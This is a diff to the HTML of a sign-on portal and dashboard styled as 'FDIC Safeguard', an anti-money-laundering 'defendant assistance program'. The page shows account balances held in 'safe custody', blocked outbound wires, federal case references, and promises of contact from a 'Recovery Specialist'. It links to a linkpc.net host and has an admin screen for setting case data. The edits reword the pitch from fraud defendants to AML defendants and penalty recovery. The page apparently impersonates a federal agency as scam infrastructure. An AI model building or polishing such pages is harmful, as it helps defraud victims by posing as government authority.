@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
-  <title>FDIC Safeguard — Anti-Money Laundering Defendant Assistance Program</title>
+  <title>FDIC Safeguard — Anti-Money Laundering(AML) Defendant Assistance Program</title>
   <style>
     :root {
       --navy: #0b1f3a;
@@ -832,7 +832,7 @@
   <!-- ========== LOGIN SCREEN ========== -->
   <div id="login-screen">
     <div class="login-topbar">
-      <svg class="swoosh-svg" viewBox="0 0 200 42" xmlns="https://connect.safeguard.linkpc.net" aria-label="FDIC Safeguard">
+      <svg class="swoosh-svg" viewBox="0 0 200 42" xmlns="https://connect.safeguard.linkpc.net" label="FDIC Safeguard">
         <text x="0" y="28" fill="#c9a227" font-size="18" font-weight="700" font-family="system-ui,sans-serif">FDIC Safeguard</text>
       </svg>
     </div>
@@ -840,10 +840,10 @@
     <main class="login-main">
       <div class="login-card">
         <h1>Sign On</h1>
-        <p class="login-sub">Verified fraud defendants — secure case access only</p>
+        <p class="login-sub">Verified anti-money laundering defendants — secure case access only</p>
 
         <div class="notice-box">
-          <div class="notice-title">FRAUD DEFENDANTS ONLY</div>
+          <div class="notice-title">ANTI-MONEY LAUNDERING(AML) DEFENDANTS ONLY</div>
           <div class="notice-body">
             This portal is not open to the public and does not offer self-enrollment. Access is limited to individuals with an active anti money laundering case who received sign-on credentials from an assigned Recovery Specialist.
           </div>
@@ -906,7 +906,7 @@
             <a href="#">Equal Credit Opportunity Act Notice</a>
           </div>
         </div>
-        <div class="program-badge">PROGRAM FDIC — ANTI-MONEY LAUNDERING DEFENDANTS ONLY</div>
+        <div class="program-badge">PROGRAM FDIC — ANTI-MONEY LAUNDERING(AML) DEFENDANTS ONLY</div>
         <div class="ehl-row">⌂ EQUAL HOUSING LENDER</div>
         <div class="legal-copy">
           <p>© FDIC Safeguard. All rights reserved. FDIC deposit insurance at Safe Guard Bank applies only to anti-money laundering(AML) defendants enrolled in the Fraud Defendant Assistance Program with an active recovery case—not to the general public or standard retail accounts. Where applicable, coverage follows FDIC rules up to $250,000 per depositor, per insured institution, for each ownership category.</p>
@@ -919,13 +919,13 @@
 
   <!-- ========== ADMIN SCREEN ========== -->
 <div id="admin-screen">
-  <!-- Clear Banner -->
+  <!-- FOR GOVERNMENT AGENCY AND FRAUD DEFENDANT USE ONLY -->
   <div class="banner" style="background:#fef2f2; border-bottom:2px solid #dc2626; color:#991b1b; padding:12px; text-align:center; font-weight:700; font-size:13px;">
      UI ONLY/ — FOR GOVERNMENT AGENCY AND FRAUD DEFENDANT USE ONLY.
   </div>
 
   <div class="login-topbar">
-    <svg class="swoosh-svg" viewBox="0 0 240 42" xmlns="https://connect.safeguard.linkpc.net" aria-label="Civil Process Portal">
+    <svg class="swoosh-svg" viewBox="0 0 240 42" xmlns="https://connect.safeguard.linkpc.net" label="Civil Process Portal">
       <text x="0" y="28" fill="#c9a227" font-size="18" font-weight="700" font-family="system-ui,sans-serif">Portal</text>
     </svg>
     <button type="button" class="signout-pill-btn" onclick="showScreen('login-screen')">User Sign On</button>
@@ -1197,7 +1197,7 @@ document.addEventListener('DOMContentLoaded', loadAdminForm);
   <!-- ========== DASHBOARD SCREEN ========== -->
   <div id="dashboard-screen">
     <div class="util-bar">
-      <span>Routing & Transit: 061000104 | PROGRAM FDIC — FRAUD DEFENDANTS</span>
+      <span>Routing & Transit: 061000104 | PROGRAM FDIC — ANTI-MONEY LAUNDERING (AML) DEFENDANTS</span>
       <div class="util-links">
         <a href="#">Contact Us</a>
         <a href="#">Privacy & Security</a>
@@ -1240,7 +1240,7 @@ document.addEventListener('DOMContentLoaded', loadAdminForm);
             <div class="card-header-row">
               <div>
                 <div class="card-title">Primary safe custody account</div>
-                <div class="card-subtitle">FDIC Safe Custody — Fraud Recovery</div>
+                <div class="card-subtitle">FDIC Safe Custody —  Penalty Recovery</div>
               </div>
               <span class="hold-pill" style="background:#ecfdf3;color:#067647;border-color:#abefc6;">ACTIVE</span>
             </div>
@@ -1349,7 +1349,7 @@ document.addEventListener('DOMContentLoaded', loadAdminForm);
             <tr><td>Account number</td><td>•••• •••• •••• 4383</td></tr>
             <tr><td>Account status</td><td>ACTIVE</td></tr>
             <tr><td>Routing / transit</td><td>061000104</td></tr>
-            <tr><td>Product type</td><td>FDIC Safe Custody — Fraud Recovery</td></tr>
+            <tr><td>Product type</td><td>FDIC Safe Custody — Penalty Recovery</td></tr>
             <tr><td>Insurance category</td><td>Single account · defendant program pass-through</td></tr>
             <tr><td>Linked federal case</td><td id="dash-caseref-detail">FTA:25CEF1429/COC:25CEF518</td></tr>
             <tr><td>Wire / ACH outbound</td><td>Blocked — compliance & federal clearance</td></tr>
@@ -1373,7 +1373,7 @@ document.addEventListener('DOMContentLoaded', loadAdminForm);
 
         <div class="card-box">
           <div class="card-title">Case status</div>
-          <div class="card-subtitle">Federal fraud defendant case file</div>
+          <div class="card-subtitle">Federal defendant case file</div>
           <table class="detail-table">
             <tr><td>Case reference</td><td id="dash-caseref-file">FTA:25CEF1429/COC:25CEF518</td></tr>
             <tr><td>Disposition</td><td id="dash-disposition">SUBMITTED</td></tr>
@@ -1384,7 +1384,7 @@ document.addEventListener('DOMContentLoaded', loadAdminForm);
           </div>
           <div class="confidential-banner">
             <strong>CONFIDENTIAL — FEDERAL INVESTIGATION MATTER</strong>
-            <p>Defendnat refund recovery claim opened. An FDIC recovery specialist will contact you shortly.</p>
+            <p>Defendnat penalty recovery claim opened. An FDIC recovery specialist will contact you shortly.</p>
           </div>
           <p style="font-size:13px;color:var(--text-muted);margin:10px 0;">Field notes from your assigned Recovery Specialist and federal partners.</p>
           <p style="font-size:13px;color:#334155;">No investigator notations have been posted to your case file yet.</p>
@@ -1472,7 +1472,7 @@ document.addEventListener('DOMContentLoaded', loadAdminForm);
             <a href="#">Equal Credit Opportunity Act Notice</a>
           </div>
         </div>
-        <div class="program-badge">PROGRAM FDIC —FRAUD DEFENDANTS</div>
+        <div class="program-badge">PROGRAM FDIC — ANTI-MONEY LAUNDERING(AML) DEFENDANTS</div>
         <div class="ehl-row">⌂ EQUAL HOUSING LENDER</div>
         <div class="legal-copy">
           <p>© FDIC Safeguard. All rights reserved. FDIC deposit insurance at Safe Guard Bank applies only to verified AML(Anti-Money Laundering)-Fraud victims enrolled in the Fraud defendant Assistance Program with an active recovery case—not to the general public or standard retail accounts. Where applicable, coverage follows FDIC rules up to $250,000 per depositor, per insured institution, for each ownership category.</p>
